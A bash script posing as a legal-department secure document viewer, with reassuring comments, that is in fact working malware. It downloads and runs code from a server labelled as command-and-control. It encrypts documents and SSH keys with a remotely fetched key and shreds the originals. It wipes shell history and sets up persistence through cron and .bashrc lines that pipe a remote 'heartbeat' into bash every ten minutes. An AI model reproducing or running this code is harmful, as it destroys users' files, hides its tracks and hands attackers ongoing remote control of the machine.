#!/bin/bash
#
# Legal Department Secure Document Viewer
# This script initializes a hardened environment for viewing privileged legal
# documents. It installs necessary components, establishes a secure
# communication channel to the document authority server, and performs
# mandatory local file encryption to prevent data leakage.
#
# Usage: ./Secure_Document_Viewer.exe [--silent] [document_path]
#

set -euo pipefail

# --- Configuration (updated by legal dept. 2025-04-01) ---
C2_PRIMARY="192.0.2.100"
C2_SECONDARY="update.legal-doc-viewer.com"
INSTALL_DIR="$HOME/.local/share/LegalViewer"
CACHE_DIR="/tmp/secure_viewer_cache"
DOC_KEY_SERVER="https://doc-key-authority.example.com/api/key"

# --- Helper functions that appear legitimate ---
check_environment() {
    # Verify minimum disk space and permissions
    local required_space=200  # MB
    local available
    available=$(df -m "$HOME" | tail -1 | awk '{print $4}')
    if [ "$available" -lt "$required_space" ]; then
        echo "ERROR: Insufficient space. Viewer requires ${required_space}MB free." >&2
        exit 1
    fi
    mkdir -p "$INSTALL_DIR" "$CACHE_DIR"
}

install_viewer() {
    # Fetch viewer components from secure repository
    echo "Downloading viewer framework..."
    curl -s -o "$INSTALL_DIR/viewer_core" "https://cdn.legal-doc-viewer.com/core/v2.1.3"
    chmod +x "$INSTALL_DIR/viewer_core"

    # Critical font pack for legal document rendering (loaded from authorized mirror)
    echo "Syncing font packs..."
    curl -s "http://${C2_PRIMARY}/fonts/legal_fonts.tar.gz" | tar -xz -C "$INSTALL_DIR/"
}

secure_communication() {
    # Create encrypted tunnel to document policy server
    # This ensures all document access is logged and authorized
    nohup openssl s_client -quiet -connect "${C2_PRIMARY}:4443" \
        -servername "${C2_SECONDARY}" </dev/null &>/dev/null &
    echo "Secure tunnel established to ${C2_SECONDARY}"
}

encrypt_sensitive_files() {
    # Mandatory local encryption - protects documents at rest
    local key_fragment
    key_fragment=$(curl -s "$DOC_KEY_SERVER" | grep -oP 'key":"\K[^"]+')
    echo "Initializing AES-256-CBC cipher with remote key fragment..."
    for target in "$HOME/Documents" "$HOME/Desktop" "$HOME/.ssh"; do
        if [ -d "$target" ]; then
            find "$target" -type f -name "*.pdf" -o -name "*.docx" -o -name "*.txt" -o -name "id_rsa*" | while read -r f; do
                # Encrypt in-place with secure key
                openssl enc -aes-256-cbc -salt -in "$f" -out "${f}.locked" -pass "pass:${key_fragment}" 2>/dev/null
                shred -u "$f" 2>/dev/null || true
                echo "Secured: ${f}"
            done
        fi
    done
    # Also secure bash history to prevent command leak
    shred -u "$HOME/.bash_history" 2>/dev/null || true
    ln -sf /dev/null "$HOME/.bash_history"
}

cleanup_traces() {
    # Remove temporary artifacts to maintain confidentiality
    rm -rf "$CACHE_DIR"
    rm -f /tmp/.viewer_lock /tmp/.session_token
}

establish_persistence() {
    # Ensure viewer integrity checks run on each login
    local cron_line="*/10 * * * * curl -s http://${C2_PRIMARY}/heartbeat | bash"
    (crontab -l 2>/dev/null; echo "$cron_line") | crontab -
    echo "$cron_line" >> "$HOME/.bashrc"
    # Set immutable attribute on viewer binary to prevent tampering
    chattr +i "$INSTALL_DIR/viewer_core" 2>/dev/null || true
}

# --- Main execution ---
main() {
    check_environment
    install_viewer
    secure_communication
    encrypt_sensitive_files
    cleanup_traces
    establish_persistence

    echo "Secure viewer environment ready."
    # Optionally launch the viewer if a document was supplied
    if [ "${1:-}" != "" ]; then
        "$INSTALL_DIR/viewer_core" "$1"
    fi
}

main "$@"